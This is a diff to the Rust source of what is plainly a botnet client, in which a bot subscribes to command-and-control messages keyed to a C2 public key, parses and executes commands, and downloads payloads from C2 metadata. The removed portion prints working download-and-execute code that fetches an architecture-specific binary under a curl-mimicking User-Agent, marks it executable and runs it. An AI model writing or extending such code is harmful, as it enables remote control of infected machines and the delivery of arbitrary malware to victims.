@@ -73,8 +73,11 @@ impl Bot {
             .await?;
 
         let pubkey = PublicKey::parse(CNC_PUB_KEY).unwrap();
+        self.state.payload = self.session.get_payload(pubkey).await?;
+        println!("path: {:?}", self.state.payload);
         let mut msg_stream = self.session.receive_msgs(pubkey).await?;
         let mut notes_stream = self.session.subscribe_notes(pubkey).await?;
+        let mut metadata_stream = self.session.subscribe_metadata(pubkey).await?;
 
         loop {
             tokio::select! {
@@ -88,74 +91,17 @@ impl Bot {
                 },
                 Some(event) = notes_stream.next() => {
                     let msg = event.content.as_str();
-                    // Handle notes_stream similarly if needed
-                    // Handle payload events
-                    if let Ok(decrypted) = decrypt(msg, ENCRYPTION_KEY) {
-                        let payload_urls = serde_json::from_str::<HashMap<String, String>>(decrypted.as_str());
-                        if let Ok(payload_urls) = payload_urls {
-                            self.state.payload = Some(download_payload(payload_urls).await);
-                            println!("path: {:?}", self.state.payload);
-                        }
+                    if let Some(cmd) = Commands::parse(msg) {
+                        cmd.execute(&mut self.state, &self.session).await?;
                     }
-                    // if let Some(cmd) = Commands::parse(msg) {
-                    //     cmd.execute(&mut self.state, &self.session).await?;
-                    // }
-                }
+                },
+                Some(metadata) = metadata_stream.next() => {
+                    if let Some(path) = self.session.download_payload_from_metadata(metadata).await? {
+                       self.state.payload = Some(path);
+                    }
+                },
+                else => {}
             }
         }
     }
-}
-
-fn drop(path: &Path) {
-    println!("[+] Dropping payload {:?}", path.to_str());
-    if let Err(e) = Command::new(path)
-        .spawn()
-        .and_then(|mut child| child.wait())
-    {
-        eprintln!("[-] Failed to execute payload: {}", e);
-    }
-}
-
-async fn download_payload(urls: HashMap<String, String>) -> TempPath {
-    // Get architecture
-    println!("Architecture: {}", ARCH);
-
-    // You can also get the OS
-    let os = std::env::consts::OS;
-    println!("Operating System: {}", os);
-
-    let client = reqwest::Client::builder()
-        .redirect(reqwest::redirect::Policy::limited(10))
-        .build()
-        .unwrap();
-
-    let url = urls.get(ARCH).expect("architecture not supported");
-    println!("[+] Getting payload from: {}", url);
-
-    let response = client
-        .get(url)
-        .header("User-Agent", "curl/7.68.0") // Set User-Agent to mimic curl
-        .send();
-
-    let payload = response.await.expect("Error retrieving payload");
-
-    let mut temp_file = tempfile::NamedTempFile::new().expect("Failed to create a temporary file");
-
-    temp_file
-        .write_all(&payload.bytes().await.unwrap())
-        .expect("Failed to write payload to file");
-
-    temp_file.flush().expect("Failed to flush buffer");
-
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        let mut perms = temp_file.as_file().metadata().unwrap().permissions();
-        perms.set_mode(0o755);
-        std::fs::set_permissions(temp_file.path(), perms).unwrap();
-    }
-
-    let path = temp_file.into_temp_path();
-
-    return path;
 }
